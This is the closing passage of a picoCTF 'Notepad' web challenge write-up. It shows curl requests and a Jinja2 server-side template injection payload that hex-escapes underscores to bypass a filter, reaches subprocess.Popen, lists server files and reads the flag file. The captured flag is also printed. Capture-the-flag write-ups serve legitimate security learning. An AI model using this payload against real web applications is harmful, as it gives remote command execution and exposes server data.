<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
    <span class="nv">$ </span>curl https://notepad.mars.picoctf.net/?error<span class="o">=</span>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-nmraL3m59zo
    &lt;<span class="o">!</span>doctype html&gt;
    
      &lt;h3&gt;
        error: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-nmraL3m59zo
      &lt;/h3&gt;
      ..<span class="se">\t</span>emplates<span class="se">\e</span>rrors<span class="se">\a</span>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa49
    
    &lt;h2&gt;make a new note&lt;/h2&gt;
    &lt;form <span class="nv">action</span><span class="o">=</span><span class="s2">"/new"</span> <span class="nv">method</span><span class="o">=</span><span class="s2">"POST"</span><span class="o">&gt;</span>
      &lt;textarea <span class="nv">name</span><span class="o">=</span><span class="s2">"content"</span><span class="o">&gt;</span>&lt;/textarea&gt;
      &lt;input <span class="nb">type</span><span class="o">=</span><span class="s2">"submit"</span><span class="o">&gt;</span>
    &lt;/form&gt;
</code></pre></div></div>

<p>Then we got this “49”.
After a long while to craft my payload with <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti">HackTricks</a>, here is my payload for by pass the <code class="language-plaintext highlighter-rouge">_</code></p>

<p><strong>Payload:</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{{request['\x5f\x5fclass\x5f\x5f']['\x5f\x5fmro\x5f\x5f'][11]['\x5f\x5fsubclasses\x5f\x5f']()[273]("ls", shell=True, stdout=-1).communicate()[0].strip()}}
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl https://notepad.mars.picoctf.net/?error<span class="o">=</span>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-wVxNUWfAtG4
&lt;<span class="o">!</span>doctype html&gt;

  &lt;h3&gt;
    error: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-wVxNUWfAtG4
  &lt;/h3&gt;
  ..<span class="se">\t</span>emplates<span class="se">\e</span>rrors<span class="se">\a</span>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab&amp;#39<span class="p">;</span>app.py<span class="se">\n</span>flag-c8f5526c-4122-4578-96de-d7dd27193798.txt<span class="se">\n</span>static<span class="se">\n</span>templates&amp;#39<span class="p">;</span>

&lt;h2&gt;make a new note&lt;/h2&gt;
&lt;form <span class="nv">action</span><span class="o">=</span><span class="s2">"/new"</span> <span class="nv">method</span><span class="o">=</span><span class="s2">"POST"</span><span class="o">&gt;</span>
  &lt;textarea <span class="nv">name</span><span class="o">=</span><span class="s2">"content"</span><span class="o">&gt;</span>&lt;/textarea&gt;
  &lt;input <span class="nb">type</span><span class="o">=</span><span class="s2">"submit"</span><span class="o">&gt;</span>
&lt;/form&gt;
</code></pre></div></div>
<p>Do the last round for the flag:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{{request['\x5f\x5fclass\x5f\x5f']['\x5f\x5fmro\x5f\x5f'][11]['\x5f\x5fsubclasses\x5f\x5f']()[273]("cat flag-c8f5526c-4122-4578-96de-d7dd27193798.txt", shell=True, stdout=-1).communicate()[0].strip()}}
</code></pre></div></div>

<blockquote>
  <p>picoCTF{styl1ng_susp1c10usly_s1m1l4r_t0_p4steb1n}</p>
</blockquote>]]></content><author><name>HSw109</name></author><category term="write-up" /><category term="PicoCTF" /><category term="web" /><summary type="html"><![CDATA[Notepad - PicoCTF]]></summary></entry></feed>